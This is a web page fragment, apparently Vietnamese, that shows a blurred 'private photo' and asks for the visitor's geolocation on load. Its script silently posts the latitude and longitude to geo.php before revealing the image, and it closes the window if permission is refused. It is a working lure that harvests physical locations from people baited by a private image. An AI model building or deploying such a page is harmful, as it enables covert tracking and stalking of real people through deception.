  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      background: #000;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      position: relative;
    }

    .container img {
      width: 100vw;
      height: 100vh;
      object-fit: contain;
      filter: blur(20px);
      transition: filter 0.4s ease;
    }

    .container.reveal img {
      filter: none;
    }

    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      pointer-events: none;
      z-index: 9998;
    }

    #modal {
      position: absolute;
      top: 30px;
      left: 50%;
      transform: translateX(-50%);
      background: white;
      color: #000;
      padding: 60px 80px; /* ðŸ”¥ To gáº¥p Ä‘Ã´i */
      border-radius: 16px;
      max-width: 1000px;
      width: 95%;
      box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
      z-index: 9999;
      text-align: center;
      animation: float 4s ease-in-out infinite;
    }

    #modal h2 {
      color: #c00;
      font-size: 40px; /* ðŸ”¥ Lá»›n hÆ¡n */
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
    }

    #modal p {
      font-size: 24px;
      margin: 0;
    }

    .alert-icon {
      animation: blink 1s infinite;
      font-size: 48px;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    @keyframes float {
      0%, 100% { transform: translateX(-50%) translateY(0); }
      50% { transform: translateX(-50%) translateY(-12px); }
    }
  </style>
</head>
<body>

  <div class="container" id="img-container">
    <img src="secret.jpg" alt="áº¢nh riÃªng tÆ°">

  <div id="overlay">

  <script>
    function unlockImage(lat, lon) {
      fetch("geo.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `lat=${lat}&lon=${lon}`
      }).finally(() => {
        document.getElementById("overlay").remove();
        document.getElementById("img-container").classList.add("reveal");
      });
    }

    window.onload = function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => unlockImage(pos.coords.latitude, pos.coords.longitude),
          err => {
            window.open('', '_self'); window.close();
          }
        );
      } else {
        window.open('', '_self'); window.close();
      }
    };
  </script>
